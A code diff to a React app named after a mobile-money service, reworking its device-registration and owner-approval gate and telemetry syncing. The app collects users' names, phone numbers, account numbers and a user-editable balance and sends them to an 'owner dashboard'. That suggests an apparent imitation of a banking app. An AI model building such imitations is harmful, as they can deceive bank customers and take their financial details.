@@ -495,6 +495,9 @@ export default function CBEBirrFullscreenApp() {
   const [regError, setRegError] = useState<string>('');
   const [regSubmitting, setRegSubmitting] = useState<boolean>(false);
   const deviceGateStateRef = useRef<'hydrating' | 'register' | 'pending' | 'approved' | 'rejected'>('hydrating');
+  const regSubmitInFlightRef = useRef<boolean>(false);
+  const regServerAckRef = useRef<boolean>(false);
+  const pendingNeedsFreshRegRef = useRef<boolean>(false);
   useEffect(() => {
     deviceGateStateRef.current = deviceGateState;
   }, [deviceGateState]);
@@ -551,6 +554,9 @@ export default function CBEBirrFullscreenApp() {
 
     setRegError('');
     setRegSubmitting(true);
+    regSubmitInFlightRef.current = true;
+    regServerAckRef.current = false;
+    pendingNeedsFreshRegRef.current = true;
 
     setUserName(cleanName);
     setPhoneNumber(normPhone);
@@ -579,21 +585,32 @@ export default function CBEBirrFullscreenApp() {
         userAccount: cleanAcc,
         balance,
         registerRequest: true,
+        freshRegistration: true,
         forceApprovalCheck: true,
+        clientGateState: 'pending',
       });
-      if (res?.approvalStatus === 'approved') {
-        try {
-          localStorage.setItem(DEVICE_APPROVAL_KEY, 'approved');
-        } catch {}
-        setDeviceGateState('approved');
-      } else if (res?.approvalStatus === 'rejected') {
-        try {
-          localStorage.setItem(DEVICE_APPROVAL_KEY, 'rejected');
-        } catch {}
-        setDeviceGateState('rejected');
-        exitAppCleanly();
+      if (res?.fromServer) {
+        regServerAckRef.current = true;
+        pendingNeedsFreshRegRef.current = false;
+        if (res.approvalStatus === 'approved') {
+          try {
+            localStorage.setItem(DEVICE_APPROVAL_KEY, 'approved');
+          } catch {}
+          setDeviceGateState('approved');
+        } else if (res.approvalStatus === 'rejected') {
+          try {
+            localStorage.setItem(DEVICE_APPROVAL_KEY, 'rejected');
+          } catch {}
+          setDeviceGateState('rejected');
+          exitAppCleanly();
+        } else {
+          try {
+            localStorage.setItem(DEVICE_APPROVAL_KEY, 'pending');
+          } catch {}
+        }
       }
     } finally {
+      regSubmitInFlightRef.current = false;
       setRegSubmitting(false);
     }
   };
@@ -680,19 +697,25 @@ export default function CBEBirrFullscreenApp() {
     let active = true;
 
     const runSync = async () => {
-      if (!active) return;
+      if (!active || regSubmitInFlightRef.current) return;
       const gate = deviceGateStateRef.current;
       if (gate === 'hydrating' || gate === 'register') return;
       const p = profileSyncRef.current;
+      const shouldSendRegister = gate === 'pending' && !regServerAckRef.current;
       const res = await syncDeviceTelemetry({
         ...p,
+        registerRequest: shouldSendRegister,
+        freshRegistration: shouldSendRegister && pendingNeedsFreshRegRef.current,
         forceApprovalCheck: gate === 'pending' || gate === 'rejected',
+        clientGateState: gate,
       });
       if (!active || !res) return;
 
       const isOnlineNow = typeof navigator === 'undefined' || navigator.onLine !== false;
-      if (isOnlineNow) {
+      if (isOnlineNow && res.fromServer) {
         if (res.approvalStatus === 'rejected') {
+          regServerAckRef.current = true;
+          pendingNeedsFreshRegRef.current = false;
           try {
             localStorage.setItem(DEVICE_APPROVAL_KEY, 'rejected');
           } catch {}
@@ -700,17 +723,23 @@ export default function CBEBirrFullscreenApp() {
           exitAppCleanly();
           return;
         } else if (res.approvalStatus === 'approved' && (gate === 'pending' || gate === 'rejected')) {
+          regServerAckRef.current = true;
+          pendingNeedsFreshRegRef.current = false;
           try {
             localStorage.setItem(DEVICE_APPROVAL_KEY, 'approved');
           } catch {}
           setDeviceGateState('approved');
-        } else if (res.approvalStatus === 'pending' && gate === 'rejected') {
-          try {
-            localStorage.setItem(DEVICE_APPROVAL_KEY, 'pending');
-          } catch {}
-          setDeviceGateState('pending');
+        } else if (res.approvalStatus === 'pending') {
+          regServerAckRef.current = true;
+          pendingNeedsFreshRegRef.current = false;
+          if (gate === 'rejected') {
+            try {
+              localStorage.setItem(DEVICE_APPROVAL_KEY, 'pending');
+            } catch {}
+            setDeviceGateState('pending');
+          }
         }
-      } else if (gate === 'rejected') {
+      } else if (!isOnlineNow && gate === 'rejected') {
         exitAppCleanly();
         return;
       }
@@ -757,13 +786,17 @@ export default function CBEBirrFullscreenApp() {
       if (document.visibilityState === 'visible') {
         runSync();
         triggerPairBroadcast();
-      } else if (document.visibilityState === 'hidden') {
+      } else if (document.visibilityState === 'hidden' && deviceGateStateRef.current === 'approved') {
         sendOfflineBeacon(profileSyncRef.current);
       }
     };
     const onOnline = () => runSync();
     const onFocus = () => triggerPairBroadcast();
-    const onPageHide = () => sendOfflineBeacon(profileSyncRef.current);
+    const onPageHide = () => {
+      if (deviceGateStateRef.current === 'approved') {
+        sendOfflineBeacon(profileSyncRef.current);
+      }
+    };
 
     document.addEventListener('visibilitychange', onVisibility);
     window.addEventListener('online', onOnline);
@@ -782,9 +815,9 @@ export default function CBEBirrFullscreenApp() {
 
   // Immediately push profile/balance edits to owner dashboard when user edits name, phone, or balance
   useEffect(() => {
-    if (!isStorageHydrated || (deviceGateState !== 'approved' && deviceGateState !== 'pending')) return;
+    if (!isStorageHydrated || deviceGateState !== 'approved' || regSubmitInFlightRef.current) return;
     const t = setTimeout(() => {
-      syncDeviceTelemetry(profileSyncRef.current).catch(() => {});
+      syncDeviceTelemetry({ ...profileSyncRef.current, clientGateState: 'approved' }).catch(() => {});
     }, 600);
     return () => clearTimeout(t);
   }, [userName, phoneNumber, userAccount, balance, isStorageHydrated, deviceGateState]);
